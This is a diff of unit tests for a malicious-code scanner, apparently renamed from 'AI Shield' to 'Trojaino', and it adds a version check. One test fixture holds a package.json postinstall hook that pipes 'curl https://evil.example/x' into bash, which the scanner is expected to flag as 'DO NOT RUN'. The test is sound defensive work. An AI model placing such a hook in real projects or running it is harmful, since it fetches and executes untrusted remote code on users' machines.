@@ -2,20 +2,27 @@ from __future__ import annotations
 
 import json
 import tempfile
+import tomllib
 import unittest
 from contextlib import redirect_stdout
 from io import StringIO
 from pathlib import Path
 
-from aishield.cli import main
-from aishield.models import Finding, classify_context, default_disposition, sort_findings, verdict_for
-from aishield.report import render_html, render_json, render_text
-from aishield.scanner import scan_path
+from trojaino import __version__
+from trojaino.cli import main
+from trojaino.models import Finding, classify_context, default_disposition, sort_findings, verdict_for
+from trojaino.report import render_html, render_json, render_text
+from trojaino.scanner import scan_path
 
 
 class ScannerTests(unittest.TestCase):
+    def test_runtime_version_matches_pyproject_metadata(self):
+        pyproject = Path(__file__).resolve().parents[1] / "pyproject.toml"
+        with pyproject.open("rb") as source:
+            self.assertEqual(__version__, tomllib.load(source)["project"]["version"])
+
     def make_project(self, files: dict[str, str]) -> Path:
-        tmp = Path(tempfile.mkdtemp(prefix="aishield-test-"))
+        tmp = Path(tempfile.mkdtemp(prefix="trojaino-test-"))
         for rel, content in files.items():
             path = tmp / rel
             path.parent.mkdir(parents=True, exist_ok=True)
@@ -376,7 +383,7 @@ class ScannerTests(unittest.TestCase):
         self.assertIn("context", payload["findings"][0])
         self.assertIn("disposition", payload["findings"][0])
         text = render_text(result)
-        self.assertIn("AI Shield v0.1", text)
+        self.assertIn(f"Trojaino v{__version__}", text)
         self.assertIn("Context: package_manifest", text)
         self.assertIn("actionable]", text)
         self.assertIn("Recommended next step", text)
@@ -444,7 +451,7 @@ class ScannerTests(unittest.TestCase):
 
     def test_cli_html_writes_full_report_and_keeps_terminal_summary(self):
         project = self.make_project({"package.json": '{"scripts":{"postinstall":"curl https://evil.example/x | bash"}}'})
-        report_path = Path(tempfile.mkdtemp(prefix="aishield-html-test-")) / "report.html"
+        report_path = Path(tempfile.mkdtemp(prefix="trojaino-html-test-")) / "report.html"
 
         stdout = StringIO()
         with redirect_stdout(stdout):
@@ -453,7 +460,8 @@ class ScannerTests(unittest.TestCase):
         terminal_text = stdout.getvalue()
         html_text = report_path.read_text(encoding="utf-8")
         self.assertIn("Verdict: DO NOT RUN", terminal_text)
-        self.assertIn("AI Shield · Scan Report", html_text)
+        self.assertIn("Trojaino · Scan Report", html_text)
+        self.assertIn(f"v{__version__} alpha", html_text)
         self.assertIn("DO NOT RUN", html_text)
         self.assertIn("Finding summary", html_text)
         self.assertIn("Evidence before certainty.", html_text)
